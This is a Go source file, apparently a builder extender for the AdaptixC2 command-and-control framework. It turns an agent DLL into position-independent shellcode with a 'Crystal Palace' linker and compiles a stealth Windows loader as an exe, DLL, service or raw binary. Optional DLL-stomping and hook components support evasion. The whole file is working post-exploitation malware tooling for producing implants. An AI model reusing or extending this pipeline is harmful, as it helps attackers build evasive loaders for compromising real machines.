package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ─── Constants ────────────────────────────────────────────────────────────────

const shellcodeTemplate = `#pragma once

// Autogenerated shellcode
// DO NOT EDIT MANUALLY

#include <cstdint>

namespace Shellcode {

    constexpr size_t Size = 0x%X;

    __attribute__((section(".text")))
    const uint8_t Data[] = {
        %s
    };

} // namespace Shellcode
`

// ─── Global Paths ─────────────────────────────────────────────────────────────

var (
	// Absolute path to the root of the project (Adaptix-StealthPalace)
	root, _   = filepath.Abs("/opt/post-exploitation/AdaptixC2/AdaptixServer/extenders/Adaptix-StealthPalace")

	buildDir   = filepath.Join(root, "build")
	srcDir     = filepath.Join(root, "src")
	loaderDir  = filepath.Join(root, "loader")
	includeDir = filepath.Join(loaderDir, "include")
	outputDir  = filepath.Join(root, "output")

	shellcodeH = filepath.Join(includeDir, "Shellcode.h")
	loaderSpec = filepath.Join(root, "crystal_palace", "specs", "loader.spec")
	linkTool   = filepath.Join(root, "crystal_palace", "link")
)


// ─── Logging ──────────────────────────────────────────────────────────────────

func logInfo(op, format string, a ...interface{}) {
	if op != "" {
		sendSuccess(op, "compile_log", fmt.Sprintf(format, a...))
	} else {
		fmt.Printf("[stealthpalace] %s\n", fmt.Sprintf(format, a...))
	}
}

func fatal(op, format string, a ...interface{}) error {
	if op == "" {
		msg := fmt.Sprintf(format, a...)
		sendError(op, "compile_log", msg)
		return fmt.Errorf("%s", msg)
	}
	return fmt.Errorf(format, a...)
}


// ─── Filesystem ───────────────────────────────────────────────────────────────

func ensureDir(op, path string) error {
	if err := os.MkdirAll(path, 0755); err != nil {
		return fatal(op, "creating directory %s failed: %v", path, err)
	}
	return nil
}

func ensureFile(op, path string) error {
	if _, err := os.Stat(path); err != nil {
		return fatal(op, "missing required file: %s", path)
	}
	return nil
}


// ─── Command Execution ────────────────────────────────────────────────────────

func run(op, dir, name string, args ...string) error {
	logInfo(op, "Executing: %s %s", name, strings.Join(args, " "))

	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fatal(op, "command failed: %s %s → %v", name, strings.Join(args, " "), err)
	}

	return nil
}


// ─── DLL Handling ─────────────────────────────────────────────────────────────

func saveDllContent(dllContent string) (string, error) {
	dllPath := filepath.Join(buildDir, "agent.dll")

	var payload DllPayload
	if err := json.Unmarshal([]byte(dllContent), &payload); err != nil {
		return "", fmt.Errorf("invalid DLL content: %v", err)
	}

	b64 := payload.DLLContent

	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", err
	}

	if err := os.WriteFile(dllPath, data, 0644); err != nil {
		return "", err
	}

	return dllPath, nil
}


// ─── COFF Compilation ─────────────────────────────────────────────────────────

func compileCoff(op, root string, p Params) error {

	cc := "x86_64-w64-mingw32-gcc"
	cflags := []string{
		"-DWIN_X64", "-shared", "-Wall", "-Wno-pointer-arith",
		"-mno-stack-arg-probe", "-fno-zero-initialized-in-bss",
	}

	// ─── STOMP DLL Support ───────────────────────────────

	if strings.HasSuffix(strings.ToLower(p.StompDLL), ".dll") {
		logInfo(op, "STOMP DLL mode enabled")
		cflags = append(cflags,
			"-DSTOMP_DLL",
			fmt.Sprintf(`-DPICO_STOMP_DLL="%s"`, p.HostDLL),
			fmt.Sprintf(`-DDLL_STOMP_DLL="%s"`, p.StompDLL),
		)
	}

	if p.Debug {
		cflags = append(cflags, "-DDEBUG", "-g")
	}

	sources := []struct {
		src string
		obj string
	}{
		{filepath.Join(srcDir, "pico.c"), filepath.Join(buildDir, "pico.x64.o")},
		{filepath.Join(srcDir, "loader.c"), filepath.Join(buildDir, "loader.x64.o")},
		{filepath.Join(srcDir, "stomp.c"), filepath.Join(buildDir, "stomp.x64.o")},
		{filepath.Join(srcDir, "services.c"), filepath.Join(buildDir, "services.x64.o")},
		{filepath.Join(srcDir, "hooks.c"), filepath.Join(buildDir, "hooks.x64.o")},
	}

	for _, s := range sources {
		args := append(cflags, "-c", s.src, "-o", s.obj)
		if err := run(op, root, cc, args...); err != nil {
			return err
		}
	}

	return nil
}


// ─── Crystal Palace Link ──────────────────────────────────────────────────────

func linkPIC(op, root, dllPath, outPath string) error {
	return run(op, root, linkTool, loaderSpec, dllPath, outPath)
}


// ─── Shellcode.h Generation ───────────────────────────────────────────────────

func generateShellcodeHeader(op, root, picPath string) error {
	data, err := os.ReadFile(picPath)
	if err != nil {
		return fatal(op, "reading PIC blob %s failed: %v", picPath, err)
	}

	header := fmt.Sprintf(shellcodeTemplate, len(data), formatHexArray(data))

	if err := os.WriteFile(shellcodeH, []byte(header), 0644); err != nil {
		return fatal(op, "writing shellcode header failed: %v", err)
	}

	logInfo(op, "Shellcode size: %d bytes", len(data))
	return nil
}


// ─── Hex Formatter ────────────────────────────────────────────────────────────

func formatHexArray(data []byte) string {
	var sb strings.Builder
	for i, b := range data {
		if i%16 == 0 {
			sb.WriteString("\n        ")
		}
		sb.WriteString(fmt.Sprintf("0x%02X,", b))
	}
	return sb.String()
}


// ─── Final Loader Compilation ────────────────────────────────────────────────

func compileFinal(op, root, format, baseName string, debug bool) ([]byte, error) {

	var sourcePath, outputPath string
	var extra []string

	switch format {
	case "exe":
		sourcePath = filepath.Join(loaderDir, "source", "main", "Exe.cc")
		outputPath = filepath.Join(outputDir, baseName+".exe")
	case "dll":
		sourcePath = filepath.Join(loaderDir, "source", "main", "Dll.cc")
		outputPath = filepath.Join(outputDir, baseName+".dll")
		extra = append(extra, "-shared")
	case "svc":
		sourcePath = filepath.Join(loaderDir, "source", "main", "Svc.cc")
		outputPath = filepath.Join(outputDir, baseName+".exe")
	default:
		return nil, fmt.Errorf("invalid format: %s", format)
	}

	subsystem := "-mwindows"
	if debug {
		subsystem = "-mconsole"
	}

	args := []string{
		"-target", "x86_64-w64-mingw32",
		"-I", includeDir,
		"-o", outputPath,
		sourcePath,
		"-Os", subsystem,
		"-nostdlib", "-s",
		"-lkernel32", "-ladvapi32",
	}

	args = append(args, extra...)

	

	err := run(op, root, "clang++", args...)
	if err != nil {
		return nil, err
	}
	if op != "" {
		return nil, nil
	}
	
	return os.ReadFile(outputPath)
}


// ─── Main Pipeline ────────────────────────────────────────────────────────────

func Compile(operator string, builderId string, p Params) []byte {

	start := time.Now()

	logInfo(operator, "Build started from directory %s", root)

	agentDLL, err := saveDllContent(p.DLL)
	if err != nil {
		fatal(operator, "saving agent dll failed: %v", err)
		return nil
	}

	if err := ensureFile(operator, agentDLL); err != nil {
		return nil
	}

	ensureDir(operator, buildDir)
	ensureDir(operator, outputDir)

	if !p.SkipCoff {
		if err := compileCoff(operator, root, p); err != nil {
			return nil
		}
	}

	picPath := filepath.Join(buildDir, p.Pic)
	if p.Format == "bin" {
		Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Step 1/1: Crystal Palace linking")	
	} else {
		Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Step 1/3: Crystal Palace linking")
	}
	if !p.SkipLink {
		if err := linkPIC(operator, root, agentDLL, picPath); err != nil {
			return nil
		}
	}
	Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Crystal Palace linking completed")

	if p.Format == "bin" {
		// append .bin to the output name to avoid confusion with PE formats
		binPath := filepath.Join(outputDir, fmt.Sprintf("%v.bin", p.Out))
		if err := os.Rename(picPath, binPath); err != nil {
			return nil
		}
		Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, fmt.Sprintf("Build completed in %s", time.Since(start)))
		logInfo(operator, "Build completed in %s", time.Since(start))
		output, err := os.ReadFile(binPath)
		if err != nil {
			Ts.TsAgentBuildLog(builderId, BUILD_LOG_ERROR, fmt.Sprintf("Failed to read final binary: %v", err))
			return nil
		}
		if operator != "" {
			return nil
		}
		return output
		
	}

	Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Step 2/3: Generating shellcode header")

	if err := generateShellcodeHeader(operator, root, picPath); err != nil {
		Ts.TsAgentBuildLog(builderId, BUILD_LOG_ERROR, fmt.Sprintf("Failed to generate shellcode header: %v", err))
		return nil
	}

	Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Shellcode header generated")
	Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, "Step 3/3: Final loader compilation")
	output, err := compileFinal(operator, root, p.Format, p.Out, p.Debug)
	if err != nil {
		Ts.TsAgentBuildLog(builderId, BUILD_LOG_ERROR, fmt.Sprintf("Final compilation failed: %v", err))
		return nil
	}

	logInfo(operator, "Build completed in %s", time.Since(start))
	Ts.TsAgentBuildLog(builderId, BUILD_LOG_INFO, fmt.Sprintf("Build completed in %s", time.Since(start)))
	if operator != "" {
		return nil
	}
	return output
	
}